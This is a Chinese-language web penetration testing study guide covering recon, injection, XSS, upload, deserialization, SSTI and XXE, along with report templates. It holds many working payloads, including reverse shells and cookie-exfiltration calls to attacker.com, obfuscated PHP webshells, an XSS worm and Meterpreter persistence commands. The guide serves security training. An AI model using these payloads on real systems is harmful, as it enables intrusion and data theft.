# Web渗透测试完整学习指南

## 📋 学习路线图

```
基础准备(2-4周) → 信息收集(1-2周) → 漏洞挖掘(4-6周) → 权限提升(2-3周) → 高级技术(3-4周) → 实战演练(持续)
```

## ⚖️ 法律声明与道德准则

> **重要提醒**: 未经授权的渗透测试是违法行为！

### 合法使用场景
- ✅ 获得书面授权的渗透测试项目
- ✅ 个人搭建的测试环境（DVWA、WebGoat等）
- ✅ 合法的CTF竞赛和漏洞赏金计划
- ✅ 企业内部安全审计（需授权）

### 禁止行为
- ❌ 未授权访问他人系统
- ❌ 破坏性测试和数据删除
- ❌ 利用漏洞进行非法获利
- ❌ 传播恶意代码

---

## 1. 基础知识体系

### 1.1 网络协议深入理解

#### HTTP/HTTPS协议
**核心概念**:
- HTTP请求方法: GET、POST、PUT、DELETE、HEAD、OPTIONS、PATCH
- 响应状态码: 1xx信息、2xx成功、3xx重定向、4xx客户端错误、5xx服务器错误
- 请求头/响应头的安全意义

**实战案例 - HTTP请求走私**:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

**关键安全点**:
- Cookie的安全属性: Secure、HttpOnly、SameSite
- CORS跨域资源共享配置错误
- HTTPS中间人攻击与证书验证

#### TCP/IP协议栈
**三次握手与四次挥手**:
```
客户端                    服务器
  |----SYN seq=x--------->|
  |<---SYN-ACK seq=y------|
  |----ACK seq=x+1------->|
```

**渗透测试中的应用**:
- TCP SYN扫描（隐蔽扫描）
- TCP连接扫描（全连接扫描）
- TCP FIN/NULL/XMAS扫描（规避防火墙）

#### DNS解析机制
**DNS记录类型**:
- A记录: IPv4地址
- AAAA记录: IPv6地址
- CNAME记录: 别名记录
- MX记录: 邮件服务器
- TXT记录: 文本信息（SPF、DKIM）

**DNS安全测试**:
```bash
# DNS区域传送漏洞测试
dig @ns1.target.com target.com axfr

# DNS缓存投毒检测
dig @8.8.8.8 target.com +trace

# 子域名枚举
subfinder -d target.com
amass enum -d target.com
```

#### WebSocket协议
**安全风险**:
- WebSocket劫持
- 跨站WebSocket劫持（CSWSH）
- 消息注入攻击

**测试示例**:
```javascript
// WebSocket连接测试
const ws = new WebSocket('wss://target.com/socket');
ws.onopen = () => {
    ws.send(JSON.stringify({
        type: 'admin',
        command: 'getUserList'
    }));
};
```

### 1.2 Web技术栈安全

#### 前端技术安全
**HTML安全**:
- HTML注入与标签过滤绕过
- iframe沙箱逃逸
- 元标签利用

**JavaScript安全**:
```javascript
// 原型链污染示例
let obj = {};
obj.__proto__.polluted = 'true';
console.log({}.polluted); // 输出: true

// DOM型XSS
let search = location.search.substring(1);
document.getElementById('output').innerHTML = search; // 危险!
```

**CSS注入**:
```css
/* CSS数据窃取 */
input[value^="a"] {
    background: url('http://attacker.com/?char=a');
}
```

#### 后端框架漏洞

**PHP常见漏洞**:
```php
// 文件包含漏洞
include($_GET['page']); // 危险!

// 反序列化漏洞
$user = unserialize($_COOKIE['user']); // 危险!

// 命令注入
system("ping -c 4 " . $_GET['ip']); // 危险!
```

**Java常见漏洞**:
```java
// JDBC注入
String query = "SELECT * FROM users WHERE id=" + request.getParameter("id");

// 表达式注入(SpEL)
parser.parseExpression(userInput).getValue(); // 危险!
```

**Python/Django漏洞**:
```python
# ORM注入
User.objects.extra(where=["username='%s'" % request.GET['name']]) # 危险!

# SSTI模板注入
template = Template(user_input) # 危险!
```

#### 数据库安全

**MySQL注入防护绕过**:
```sql
-- 绕过空格过滤
SELECT/**/username/**/FROM/**/users

-- 绕过引号过滤
SELECT * FROM users WHERE id=0x61646d696e

-- 时间盲注
SELECT IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
```

**NoSQL注入**:
```javascript
// MongoDB注入示例
db.users.find({
    username: req.body.username,
    password: req.body.password
});

// 攻击载荷
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

---

## 2. 信息收集方法论

### 2.1 被动信息收集

#### 搜索引擎利用（Google Hacking）

**常用Dork语法**:
```
site:target.com filetype:pdf           # 查找PDF文件
site:target.com inurl:admin            # 查找管理后台
site:target.com intitle:"index of"     # 查找目录列表
site:target.com ext:sql | ext:db       # 查找数据库文件
site:target.com intext:"password"      # 查找密码信息
```

**高级搜索技巧**:
```
# 查找配置文件
site:target.com ext:env | ext:config | ext:ini

# 查找API密钥
site:target.com intext:"api_key" | intext:"apikey"

# 查找敏感目录
site:target.com inurl:"/backup/" | inurl:"/old/"

# 查找错误信息
site:target.com intext:"sql syntax" | intext:"warning: mysql"
```

#### OSINT开源情报收集

**域名信息查询**:
```bash
# Whois查询
whois target.com

# DNS记录查询
dig target.com ANY
nslookup -type=any target.com

# 历史DNS记录
curl -s "https://securitytrails.com/domain/target.com/dns"
```

**社交媒体情报**:
- LinkedIn员工信息收集（技术栈、部门结构）
- GitHub代码泄露搜索
- Twitter/X技术讨论分析
- 招聘网站技术栈信息

**工具推荐**:
```bash
# theHarvester - 邮箱和子域名收集
theHarvester -d target.com -b all

# Shodan - 互联网设备搜索
shodan search "hostname:target.com"

# Censys - SSL证书搜索
censys search "target.com"
```

### 2.2 主动信息收集

#### 端口扫描策略

**Nmap扫描技术**:
```bash
# TCP SYN扫描（隐蔽扫描）
nmap -sS -p- target.com

# 服务版本检测
nmap -sV -p 80,443,8080 target.com

# 操作系统识别
nmap -O target.com

# 全面扫描（NSE脚本）
nmap -A -p- target.com

# 绕过防火墙
nmap -f -D RND:10 -p- target.com

# UDP扫描
nmap -sU -p 53,161,162 target.com
```

**Masscan高速扫描**:
```bash
# 全端口快速扫描
masscan -p1-65535 --rate=10000 target.com

# 扫描Web端口
masscan -p80,443,8000-9000 --rate=5000 10.0.0.0/8
```

#### 目录枚举

**工具使用**:
```bash
# Gobuster目录爆破
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50

# Dirsearch
dirsearch -u https://target.com -e php,html,js -x 403,404

# Feroxbuster（递归扫描）
feroxbuster -u https://target.com -w wordlist.txt --depth 3

# ffuf（快速模糊测试）
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302
```

**自定义字典生成**:
```bash
# CeWL - 从网站生成字典
cewl https://target.com -d 3 -m 5 -w wordlist.txt

# Crunch - 生成密码字典
crunch 8 12 -t admin%%%% -o passwords.txt
```

#### 子域名枚举

**被动枚举**:
```bash
# Sublist3r
sublist3r -d target.com -o subdomains.txt

# Amass被动模式
amass enum -passive -d target.com

# 证书透明度日志
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**主动枚举**:
```bash
# Amass主动模式
amass enum -active -d target.com -brute -w subdomains-top1mil.txt

# Subfinder
subfinder -d target.com -o subdomains.txt

# DNS字典爆破
dnsrecon -d target.com -t brt -D subdomains.txt
```

**子域名接管检测**:
```bash
# SubOver
SubOver -l subdomains.txt -o takeover.txt

# Subjack
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
```

---

## 3. 漏洞挖掘核心技术

### 3.1 注入类漏洞深入

#### SQL注入完整攻击链

**注入点识别**:
```sql
-- 单引号测试
' OR '1'='1

-- 双引号测试
" OR "1"="1

-- 数字型注入
1 OR 1=1

-- 时间盲注
1' AND SLEEP(5)--

-- 报错注入
1' AND extractvalue(1,concat(0x7e,database()))--
```

**联合查询注入**:
```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
...

-- 确定显示位
' UNION SELECT 1,2,3,4--

-- 提取数据
' UNION SELECT 1,database(),user(),version()--

-- 提取表名
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--

-- 提取列名
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--

-- 提取数据
' UNION SELECT 1,username,password,email FROM users--
```

**时间盲注自动化**:
```python
import requests
import time

def time_based_sqli(url, payload_template):
    result = ""
    for i in range(1, 50):
        for char in range(32, 127):
            payload = payload_template.format(position=i, char=char)
            start = time.time()
            requests.get(url + payload)
            elapsed = time.time() - start

            if elapsed >= 5:
                result += chr(char)
                print(f"[+] Found char: {chr(char)}, Result: {result}")
                break
        else:
            break
    return result

# 使用示例
url = "http://target.com/page?id=1"
payload = "' AND IF(ASCII(SUBSTRING(database(),{position},1))={char},SLEEP(5),0)--"
database_name = time_based_sqli(url, payload)
```

**SQLMap自动化利用**:
```bash
# 基础注入检测
sqlmap -u "http://target.com/page?id=1" --batch

# 指定注入技术
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ

# 获取数据库信息
sqlmap -u "http://target.com/page?id=1" --dbs --current-db --current-user

# 提取表和数据
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# POST请求注入
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" -p username

# Cookie注入
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=xxx" --level=2

# WAF绕过
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
```

#### NoSQL注入攻击

**MongoDB注入**:
```javascript
// 认证绕过
db.users.find({username: {$ne: null}, password: {$ne: null}})

// JavaScript注入
db.users.find({$where: "this.username == '" + username + "'"})

// 攻击载荷
username[$ne]=null&password[$ne]=null

// 盲注
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
```

**防御绕过技巧**:
```json
{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
}

{
    "username": {"$regex": ".*"},
    "password": {"$exists": true}
}
```

#### 命令注入

**命令执行漏洞**:
```bash
# 基础注入
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | ls -la

# 绕过空格过滤
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# 绕过关键词过滤
c''at /etc/passwd
c\at /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# 反弹Shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/bash attacker.com 4444
```

**盲命令注入检测**:
```bash
# DNS外带
nslookup `whoami`.attacker.com

# HTTP外带
curl http://attacker.com/$(whoami)

# 时间延迟
ping -c 10 127.0.0.1
sleep 10
```

### 3.2 跨站脚本攻击（XSS）

#### 反射型XSS

**基础载荷**:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
```

**绕过技巧**:
```html
<!-- 大小写绕过 -->
<ScRiPt>alert(1)</sCrIpT>

<!-- 编码绕过 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- 过滤绕过 -->
<img src=x onerror=alert`1`>
<svg><script>alert&#40;1)</script>

<!-- 事件处理器 -->
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>

<!-- 协议处理器 -->
<a href="javascript:alert(1)">Click</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>
```

**Cookie窃取**:
```javascript
<script>
new Image().src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
});
</script>
```

#### 存储型XSS

**持久化攻击**:
```html
<!-- 评论区XSS -->
<img src=x onerror="setInterval(function(){new Image().src='http://attacker.com/keylog?k='+document.body.innerText},5000)">

<!-- 个人资料XSS -->
<script>
if(document.cookie.indexOf('admin') !== -1){
    window.location = 'http://attacker.com/admin?cookies=' + document.cookie;
}
</script>
```

**蠕虫式XSS**:
```javascript
<script>
// 自我复制的XSS蠕虫
var payload = '<script>/* XSS代码 */<\/script>';
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/comment', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({comment: payload}));
</script>
```

#### DOM型XSS

**DOM操作漏洞**:
```javascript
// 危险的DOM操作
document.getElementById('output').innerHTML = location.hash.substring(1);

// 攻击载荷
http://target.com/#<img src=x onerror=alert(1)>
```

**AngularJS模板注入**:
```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

**jQuery选择器注入**:
```javascript
$('#' + location.hash.substring(1)).html('content');
// 攻击: http://target.com/#<img src=x onerror=alert(1)>
```

#### CSP绕过技术

**基础CSP策略**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

**绕过方法**:
```html
<!-- JSONP端点滥用 -->
<script src="https://trusted.cdn.com/jsonp?callback=alert"></script>

<!-- AngularJS库利用 -->
<script src="https://trusted.cdn.com/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- Base标签注入 -->
<base href="http://attacker.com/">
<script src="/evil.js"></script>
```

### 3.3 跨站请求伪造（CSRF）

**CSRF攻击示例**:
```html
<!-- GET型CSRF -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

<!-- POST型CSRF -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- JSON CSRF -->
<script>
fetch('http://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 1000})
});
</script>
```

**Token绕过技术**:
```javascript
// Token泄露
<script>
fetch('/profile')
    .then(r => r.text())
    .then(html => {
        var token = html.match(/csrf_token" value="([^"]+)"/)[1];
        fetch('/transfer', {
            method: 'POST',
            body: 'to=attacker&amount=1000&csrf_token=' + token
        });
    });
</script>
```

### 3.4 文件上传漏洞

#### 文件类型绕过

**MIME类型绕过**:
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**文件扩展名绕过**:
```
shell.php.jpg        # 双扩展名
shell.php%00.jpg     # 空字节注入（旧版本）
shell.php/.          # 特殊字符
shell.php::$DATA     # NTFS ADS
shell.php%20         # 空格截断
shell.php.           # 点号截断
```

**文件头伪造**:
```php
GIF89a
<?php system($_GET['cmd']); ?>
```

**内容检测绕过**:
```php
# 图片马制作
copy /b normal.jpg + shell.php image.jpg

# Webshell隐藏
<?php @eval($_POST['cmd']); ?> // 混淆在正常图片数据中
```

#### Webshell利用

**PHP一句话木马**:
```php
<?php @eval($_POST['cmd']); ?>
<?php system($_GET['c']); ?>
<?=`$_GET[c]`?>
<?=system($_REQUEST[c]);?>
```

**免杀技巧**:
```php
<?php
$a = str_replace('x','','sxysxtxexm');
$b = str_replace('x','','$x_xGxExTx[xcx]');
$a($b);
?>

<?php
$_=("%01%02%03%04%05%06%07%08%09%10%11%12%13%14%15%16%17%18%19%20%21%22%23%24%25%26%27%28%29%30%31%32%33%34%35%36%37%38%39%40%41%42%43%44%45%46%47%48%49%50%51%52%53%54%55%56%57%58%59%60%61%62%63%64%65%66%67%68%69%70%71%72%73%74%75%76%77%78%79%80%81%82%83%84%85%86%87%88%89%90%91%92%93%94%95%96%97%98%99");
$__=explode("%",$_);
$___=$__[28].$__[34].$__[28].$__[29].$__[30].$__[33];
$___($_POST['cmd']);
?>
```

---

## 4. 身份认证与授权攻击

### 4.1 认证机制绕过

#### 弱密码攻击

**常见默认凭证**:
```
admin:admin
admin:password
admin:123456
root:root
administrator:administrator
```

**密码喷洒攻击**:
```bash
# Hydra暴力破解
hydra -L users.txt -P passwords.txt http-post-form "http://target.com/login:username=^USER^&password=^PASS^:Invalid"

# Burp Intruder批量测试
# 使用小批量常见密码对大量用户进行测试，避免账户锁定
```

**字典生成策略**:
```bash
# 基于公司信息生成字典
Company2023!
Company@2023
Company#2023

# 基于用户信息
John@1990
John.Smith
JSmith123
```

#### 多因素认证（MFA）绕过

**常见绕过方法**:
```
1. 会话固定: 在MFA验证前固定会话ID
2. 响应篡改: 修改认证响应为成功状态
3. 备用渠道: 利用未保护的API端点
4. 爆破短信验证码: 4-6位数字可能被爆破
5. OAuth流程劫持: 窃取授权码
```

**2FA绕过测试**:
```http
# 尝试跳过2FA页面
POST /verify-2fa HTTP/1.1

# 修改为
POST /dashboard HTTP/1.1

# 或修改响应
HTTP/1.1 200 OK
{"status": "success", "2fa_required": false}
```

### 4.2 会话管理漏洞

#### 会话劫持

**Cookie窃取**:
```javascript
// 通过XSS窃取Cookie
<script>
document.location='http://attacker.com/steal?c='+document.cookie;
</script>

// 发送到远程服务器
fetch('http://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        url: location.href,
        user_agent: navigator.userAgent
    })
});
```

**会话固定攻击**:
```http
# 攻击者设置会话ID
http://target.com/login?PHPSESSID=attacker_session_id

# 受害者使用该会话登录
# 攻击者使用相同会话ID访问受害者账户
```

#### JWT安全

**JWT结构**:
```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**JWT攻击技术**:
```python
# 算法混淆攻击(alg: none)
import jwt
import base64

header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload = base64.urlsafe_b64encode(b'{"sub":"admin","exp":9999999999}').decode().rstrip('=')
token = f"{header}.{payload}."

# RS256转HS256攻击
# 使用公钥作为HMAC密钥签名JWT
import jwt
public_key = open('public.pem').read()
token = jwt.encode({'sub': 'admin'}, public_key, algorithm='HS256')

# 弱密钥爆破
hashcat -m 16500 jwt.txt wordlist.txt

# 密钥混淆
# 使用kid参数注入
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
```

---

## 5. 业务逻辑漏洞挖掘

### 5.1 支付逻辑漏洞

**金额篡改**:
```http
POST /api/order HTTP/1.1

{
    "product_id": 123,
    "quantity": 1,
    "price": 0.01,    # 篡改价格
    "total": 0.01
}
```

**订单重放**:
```python
# 捕获支付成功的请求，重复发送
import requests

order_request = {
    "order_id": "ORDER123",
    "amount": 100,
    "status": "paid"
}

for i in range(100):
    response = requests.post('http://target.com/api/confirm_payment', json=order_request)
    print(f"[{i}] {response.status_code}")
```

**并发竞争**:
```python
import threading
import requests

def purchase_with_balance():
    # 余额100元，商品99元
    requests.post('http://target.com/purchase', json={'product': 'item1', 'price': 99})

# 同时发起多个请求，可能购买多件商品
threads = []
for i in range(10):
    t = threading.Thread(target=purchase_with_balance)
    threads.append(t)
    t.start()
```

### 5.2 权限控制漏洞

#### 垂直权限提升

**IDOR (不安全的直接对象引用)**:
```http
# 普通用户访问管理员功能
GET /api/admin/users HTTP/1.1
Cookie: session=normal_user_session

# 修改用户ID获取他人信息
GET /api/user/profile?id=1 HTTP/1.1  # 测试不同ID
GET /api/user/profile?id=2 HTTP/1.1
```

**功能权限绕过**:
```http
# 前端隐藏管理功能，但后端未验证
POST /api/delete_user HTTP/1.1
Cookie: session=normal_user_session

{"user_id": 123}
```

#### 水平权限提升

**用户数据越权**:
```http
# 修改他人订单
PUT /api/order/12345 HTTP/1.1

{
    "status": "cancelled",
    "user_id": "victim_id"  # 尝试修改他人订单
}

# 查看他人私密信息
GET /api/messages?user_id=victim_id HTTP/1.1
```

---

## 6. 高级攻击技术

### 6.1 反序列化漏洞

#### Java反序列化

**漏洞原理**:
```java
// 危险的反序列化操作
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject(); // 未验证输入
```

**利用链构造**:
```bash
# ysoserial工具利用
java -jar ysoserial.jar CommonsCollections6 "calc.exe" | base64

# 反弹Shell
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

**常见漏洞组件**:
- Apache Commons Collections
- Spring Framework
- Fastjson
- Jackson
- XStream

#### PHP反序列化

**魔术方法利用**:
```php
class Evil {
    private $cmd;

    function __construct($cmd) {
        $this->cmd = $cmd;
    }

    function __destruct() {
        system($this->cmd);  # 对象销毁时执行命令
    }
}

// 攻击载荷
$payload = serialize(new Evil('whoami'));
echo $payload;
// O:4:"Evil":1:{s:9:"Evilcmd";s:6:"whoami";}
```

**POP链构造**:
```php
# 利用对象属性导向编程构造攻击链
class Start {
    public $target;
    function __destruct() {
        $this->target->action();
    }
}

class Middle {
    public $var;
    function action() {
        eval($this->var);
    }
}

$exploit = new Start();
$exploit->target = new Middle();
$exploit->target->var = 'system("id");';
echo serialize($exploit);
```

### 6.2 服务端模板注入（SSTI）

**Jinja2模板注入**:
```python
# Flask/Jinja2漏洞
{{ config }}
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}

# 命令执行
{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}

# 读取文件
{{ ''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read() }}
```

**Thymeleaf模板注入**:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

**Smarty模板注入**:
```php
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_GET['cmd']); ?>",self::clearConfig())}
```

### 6.3 XXE攻击（XML外部实体注入）

**基础XXE**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>
```

**外带数据（OOB XXE）**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
%send;
]>
<root></root>
```

evil.dtd内容:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

**SSRF via XXE**:
```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<root>&xxe;</root>
```

---

## 7. 工具使用精通

### 7.1 Burp Suite专业技巧

**Intruder攻击类型**:
```
1. Sniper: 单一位置，逐个测试
2. Battering ram: 所有位置使用相同载荷
3. Pitchfork: 多位置，载荷并行
4. Cluster bomb: 多位置，载荷笛卡尔积
```

**Macro宏录制**:
```
1. 录制登录过程
2. 提取CSRF Token
3. 应用到其他请求
```

**Extender插件推荐**:
- Autorize: 自动化权限测试
- Turbo Intruder: 高速攻击
- J2EEScan: Java应用扫描
- Retire.js: 前端组件漏洞检测
- ActiveScan++: 增强主动扫描

### 7.2 Metasploit渗透框架

**基础使用流程**:
```bash
# 搜索exploit
msfconsole
search apache
search type:exploit platform:linux

# 使用exploit
use exploit/multi/http/struts2_content_type_ognl
show options
set RHOSTS target.com
set LHOST attacker.ip
run

# 后渗透
sessions -l
sessions -i 1
use post/multi/manage/shell_to_meterpreter
```

**Meterpreter常用命令**:
```bash
# 系统信息
sysinfo
getuid
getprivs

# 文件操作
download /etc/passwd
upload backdoor.exe C:\\Windows\\Temp

# 进程操作
ps
migrate 1234

# 权限提升
getsystem
run post/windows/gather/hashdump

# 持久化
run persistence -X -i 60 -p 4444 -r attacker.ip
```

### 7.3 自动化扫描工具

**Nuclei模板引擎**:
```bash
# 基础扫描
nuclei -u https://target.com

# 指定模板
nuclei -u https://target.com -t cves/

# 批量扫描
nuclei -l targets.txt -o results.txt

# 自定义模板
nuclei -u https://target.com -t custom-template.yaml
```

**自定义Nuclei模板**:
```yaml
id: custom-sqli-detection

info:
  name: SQL Injection Detection
  author: pentest
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/page?id=1'"
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-"
        condition: or
```

---

## 8. 防护绕过技术

### 8.1 WAF绕过方法

#### 规则识别
```bash
# WAF指纹识别
wafw00f https://target.com
nmap --script=http-waf-detect target.com
```

#### 编码绕过
```
URL编码: %27 OR %31=%31
双URL编码: %2527 OR %2531=%2531
Unicode编码: \u0027 OR \u0031=\u0031
十六进制编码: 0x27 OR 0x31=0x31
```

#### 大小写混淆
```sql
SeLeCt * FrOm users
sELEct * fROM users
```

#### 注释插入
```sql
SELECT/**/username/**/FROM/**/users
SELECT%0Ausername%0AFROM%0Ausers
```

#### 分块传输
```http
POST /api HTTP/1.1
Transfer-Encoding: chunked

5
<?php
5
syste
3
m('
2
id
3
');
2
?>
0
```

### 8.2 CDN绕过

**真实IP发现**:
```bash
# 子域名查找
subfinder -d target.com | dnsx -resp-only

# 历史DNS记录
curl -s "https://securitytrails.com/domain/target.com/history/a"

# SSL证书查询
censys search "target.com"

# 邮件头分析
发送邮件到目标，查看邮件头中的IP

# Shodan搜索
shodan search "ssl:target.com"
```

**源站直连**:
```bash
# 修改Host头直接访问源IP
curl -H "Host: target.com" http://real-ip-address

# 利用非80/443端口
nmap -p- real-ip-address
```

---

## 9. 渗透测试报告编写

### 9.1 漏洞报告结构

**标准漏洞报告模板**:

```markdown
# 漏洞报告：SQL注入漏洞

## 漏洞概述
- **漏洞名称**: SQL注入漏洞
- **发现时间**: 2024-01-15
- **影响范围**: /api/user/login
- **风险等级**: 高危

## 漏洞描述
在用户登录接口中发现SQL注入漏洞，攻击者可通过构造恶意SQL语句绕过身份验证，
获取数据库敏感信息。

## 复现步骤
1. 访问登录页面 http://target.com/login
2. 在用户名字段输入: admin' OR '1'='1'--
3. 密码随意输入
4. 点击登录，成功绕过验证进入系统

## 技术细节
**请求示例**:
POST /api/user/login HTTP/1.1
Content-Type: application/json

{
    "username": "admin' OR '1'='1'-- ",
    "password": "anything"
}

**数据库查询**:
SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='...'

## 影响评估
- 绕过身份验证机制
- 获取所有用户敏感数据
- 可能获取数据库管理员权限
- 影响用户数量: 10000+

## 修复建议
1. 使用预编译语句（Prepared Statement）
2. 实施输入验证和过滤
3. 最小权限原则配置数据库
4. 启用WAF防护规则

**修复代码示例**:
\```python
# 不安全的代码
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# 安全的代码
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
)
\```

## 验证方法
1. 部署修复后重新测试
2. 使用SQLMap自动化工具扫描
3. 代码审计验证参数化查询
```

### 9.2 渗透测试报告

**完整报告结构**:

```markdown
# 渗透测试报告

## 1. 执行摘要
### 1.1 测试概述
- 测试单位: XXX公司
- 测试时间: 2024-01-01 至 2024-01-15
- 测试范围: Web应用、移动应用、API接口
- 测试人员: 安全团队

### 1.2 总体评估
- 发现高危漏洞: 5个
- 发现中危漏洞: 12个
- 发现低危漏洞: 8个
- 整体安全等级: 中等风险

### 1.3 核心发现
1. SQL注入漏洞可导致数据库完全泄露
2. XSS漏洞可窃取管理员凭证
3. 认证绕过漏洞允许未授权访问

## 2. 测试范围
### 2.1 测试目标
- 主站: https://www.target.com
- API: https://api.target.com
- 管理后台: https://admin.target.com

### 2.2 测试方法
- 黑盒测试
- 灰盒测试（部分源码审计）
- 自动化扫描 + 手工验证

### 2.3 测试限制
- 不进行DDoS攻击
- 不进行破坏性测试
- 仅在授权范围内测试

## 3. 漏洞详情
### 3.1 高危漏洞
[详细漏洞报告...]

### 3.2 中危漏洞
[详细漏洞报告...]

### 3.3 低危漏洞
[详细漏洞报告...]

## 4. 修复优先级
1. 立即修复: SQL注入、命令执行（1-3天）
2. 短期修复: XSS、CSRF（1-2周）
3. 中期修复: 配置问题、信息泄露（1个月）

## 5. 总体建议
- 建立SDL安全开发生命周期
- 部署WAF和IDS/IPS
- 定期进行安全培训
- 实施代码审计流程
```

---

## 10. 学习验证标准

### ✅ 阶段一：基础掌握（1-2个月）
- [ ] 能够独立搭建DVWA、WebGoat等靶场环境
- [ ] 理解并演示OWASP Top 10中的每个漏洞
- [ ] 熟练使用Burp Suite进行流量拦截和修改
- [ ] 能够编写基础的Python渗透脚本
- [ ] 完成至少10个CTF Web题目

### ✅ 阶段二：技能提升（3-4个月）
- [ ] 能够绕过基础WAF规则
- [ ] 掌握至少3种反序列化漏洞利用
- [ ] 独立发现并利用IDOR漏洞
- [ ] 编写自定义Burp插件
- [ ] 参与漏洞赏金计划并提交有效报告

### ✅ 阶段三：实战应用（5-6个月）
- [ ] 完成完整的渗透测试项目（包括报告）
- [ ] 发现并负责任披露真实漏洞
- [ ] 能够进行代码审计发现漏洞
- [ ] 掌握内网渗透基础技能
- [ ] 通过CEH或OSCP认证（可选）

---

## 11. 实战环境推荐

### 在线靶场
- **DVWA**: Damn Vulnerable Web Application
- **WebGoat**: OWASP教学平台
- **bWAPP**: buggy Web Application
- **HackTheBox**: 真实环境渗透平台
- **TryHackMe**: 渐进式学习平台
- **PentesterLab**: 专业渗透测试训练

### 本地搭建
```bash
# DVWA安装
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# WebGoat安装
docker run -p 8080:8080 -t webgoat/goatandwolf

# Juice Shop
docker run -p 3000:3000 bkimminich/juice-shop
```

### CTF平台
- CTFtime: 全球CTF赛事日历
- PicoCTF: 适合初学者
- Root-Me: 挑战题库
- OverTheWire: 命令行挑战

---

## 12. 扩展学习资源

### 📚 推荐书籍
1. **《Web安全深度剖析》** - 基础到进阶
2. **《黑客攻防技术宝典：Web实战篇》** - 经典参考书
